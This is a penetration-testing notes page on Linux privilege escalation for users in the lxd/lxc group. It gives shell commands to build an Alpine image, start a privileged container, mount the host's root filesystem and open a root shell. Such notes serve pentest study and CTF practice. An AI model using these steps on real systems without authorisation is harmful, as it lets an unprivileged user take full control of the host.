---
description: If you belong to lxd or lxc group, you can become root
---

# lxd/lxc group

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)



### Linpeas result

{% code overflow="wrap" %}
```bash
./linpeas.sh # or just type id to check the lxd gropu assgined to current user.
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

## Escalation Steps

### Prepare tools and create an image

You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):

```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

This will create two files: lxd.tar.xz and rootfs.squashfs.&#x20;

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

### Add the image

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

### Initiate LXD

{% code overflow="wrap" %}
```bash
# Let's initiate the container and keep all options default. 
lxd init 
```
{% endcode %}

### Create a container, add root path, and execute the container

```bash
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
